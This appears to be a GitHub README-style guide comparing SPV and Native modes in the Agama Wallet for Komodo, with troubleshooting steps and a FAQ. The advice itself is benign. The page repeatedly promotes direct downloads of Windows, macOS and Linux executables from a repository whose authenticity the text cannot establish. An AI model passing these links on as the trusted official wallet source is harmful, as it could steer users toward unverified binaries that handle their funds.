[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Native Mode vs SPV Mode in Agama Wallet

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

Agama Wallet runs in two modes. SPV (Lite) queries remote Electrum-style servers and starts quickly; Native (Full Node) runs a local node and validates the chain itself, at the cost of disk, bandwidth and sync time. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and the mode you pick explains most of the difference between a wallet that works immediately and one that seems stuck.

## You'll see this if

The wallet is "synchronising" for hours, or a balance that appears in one mode is missing in the other.

| Symptom | Mode | Likely cause |
|---|---|---|
| Balance visible immediately, assets vary | SPV | Server responses differ by server |
| Sync takes hours after a restart | Native | Local chain data is being validated |
| "Stuck" at a height for a long time | Native | Chain data incomplete or disk slow |
| Balance missing until a rescan | Either | Address range not yet scanned |
| Preferences about privacy | Both | SPV asks remote servers; Native does not |

## Why it happens

The two modes answer different questions. SPV asks "what does a server say about my addresses"; Native asks "what does the chain say", and to answer that it must have the chain.

That produces a set of trade-offs rather than a correct choice:

- **Startup and disk.** SPV needs no local chain, so it opens in seconds and uses little space. Native downloads and validates, which is why the first run is slow.
- **Trust.** SPV trusts the servers it queries to report honestly. Native validates, so it does not need that trust.
- **Privacy.** The privacy policy states that SPV queries can expose an IP address along with address queries and transaction broadcasts. A local node does not make those queries to a third party.
- **Failure shape.** SPV failures look like missing data from a server; Native failures look like an incomplete sync.

Neither mode changes the keys, the phrase or the wallet's custody model, so switching is a choice about trust rather than about the safety of the keys. Switching modes does not move funds.

## Fix

Choose by what you need, then fix the specific symptom.

1. **Choose SPV for everyday use** if fast startup and low disk matter more than running a node.
2. **Choose Native when validation matters** and you can afford the disk and the wait.
3. **If Native sync stalls, switch to SPV** to confirm the wallet and keys are fine; the site's own guidance names this as the first fix.
4. **Restart the wallet** before assuming corruption; the site lists restart among its own remedies.
5. **Reinstall only after those two**, and restore from the phrase rather than assuming the data directory survived.
6. **Do not switch modes mid-transaction.** A pending spend should confirm before you change how the wallet reads the chain.

If a balance differs between modes, the difference is what each has seen, not what exists. [Why a balance is not one number](https://github.com/agama-wallet/utxo/blob/main/why-balance-is-not-one-number.md) explains the categories.

## If that did not work

If Native will not start at all, the local chain data is the likely culprit: an interrupted download or a full disk leaves a state the wallet cannot resume. Removing and re-syncing is the usual route, and it costs time rather than funds.

If SPV shows nothing while a block explorer shows a balance, the servers are the variable. Switching to Native removes them from the path.

If the wallet opens but a specific asset stays inactive, the asset's own sync may be separate. [Which assets Agama Wallet supports](https://github.com/agama-wallet/agama-wallet/blob/main/supported-coins.md) covers the list.

If both modes show the same wrong balance, the problem is derivation rather than sync, and [zero balance after restoring](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md) is the right starting point.

## Prevention

- **Pick a mode and learn its failure shape.** Most "wallet broken" reports are a mode behaving as designed.
- **Leave disk headroom for Native.** A full disk mid-sync is the most common self-inflicted failure.
- **Keep the phrase out of troubleshooting.** No sync problem requires it, and never type a recovery phrase into a support page.
- **Do not judge a restore until the scan finishes.** [Restoring an Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/restore-from-seed-phrase.md) sets out the order.
- **Understand what SPV trusts.** [Is Agama Wallet safe](https://github.com/agama-wallet/agama-wallet/blob/main/is-it-safe-to-use.md) covers the privacy and verification side.

## FAQ

### Which mode is safer?

Native validates the chain locally, so it does not depend on a server telling the truth. SPV is not unsafe, but it places trust in the servers it queries.

### Does switching modes move my funds?

No. Modes change how the wallet reads the chain, not where the keys are or what the addresses hold.

### Why does Native need so much disk?

Because it stores and validates the chain rather than asking someone else about it. The requirement is the price of independence.

### Does Native mode make the wallet private?

It removes the remote server from the path, which is a real improvement, but it does not make transactions anonymous: they are still public on the chain. Privacy comes from how addresses are used, not from which mode reads them.

### Why is the first Native sync so much slower than later ones?

Because the first run downloads and validates the chain from scratch, while later runs only catch up from the last stored block. A gap of weeks costs proportionally more than a gap of hours.

### Can I run Native for one asset only?

It depends on the asset's implementation in the wallet. Where an asset can only be read in one mode, the wallet says so when you try to activate it, and the error is about the asset rather than the mode.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [Agama Wallet: What It Is, and Which Agama You Are Looking At](https://github.com/agama-wallet/agama-wallet/blob/main/which-version-you-have.md)
- [Agama Wallet Shows Zero Balance: Causes and Checks](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md)
- [Restoring an Agama Wallet: Seed, Passphrase and Wallet File](https://github.com/agama-wallet/agama-wallet/blob/main/restore-from-seed-phrase.md)
- [Which Assets Agama Wallet Supports](https://github.com/agama-wallet/agama-wallet/blob/main/supported-coins.md)
